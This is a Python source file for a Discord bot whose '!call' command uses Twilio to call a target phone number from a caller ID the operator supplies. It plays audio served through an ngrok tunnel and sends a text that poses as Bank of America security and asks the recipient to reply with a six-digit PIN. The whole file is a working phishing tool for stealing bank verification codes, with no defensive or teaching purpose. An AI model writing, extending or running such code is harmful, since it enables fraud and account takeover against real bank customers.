import os
import discord
from discord.ext import commands
from twilio.rest import Client

# Enter your Twilio account SID and auth token
account_sid = "TWILIO SID"
auth_token = "TWILIO TOKEN"
client = Client(account_sid, auth_token)

# Create a Discord bot client
intents = discord.Intents.all()
intents.members = True
intents.guild_messages = True
bot = commands.Bot(command_prefix='!', intents=intents)

# Define a command to make the call and send a text message
@bot.command()
async def call(ctx, phone_number, caller_id):
    # Make the call using Twilio
    call = client.calls.create(
        to=phone_number,
        from_=caller_id,
        url="NGROK TUNNEL TO FILE"
    )

    # Send a text message using Twilio
    message = client.messages.create(
        to=phone_number,
        from_=caller_id,
        body="BANK OF AMERICA SECURITY SMS SERVICE. An unknown device has tried to log into your account multiple times. To secure your account please reply with a valid 6 digit pin."
    )

    # Send a message to the Discord server confirming the call and text message have been made
    await ctx.send(f"Calling {phone_number} from {caller_id} and sending a test message...")

# Run the Discord bot
bot.run("DISCORD BOT TOKEN")
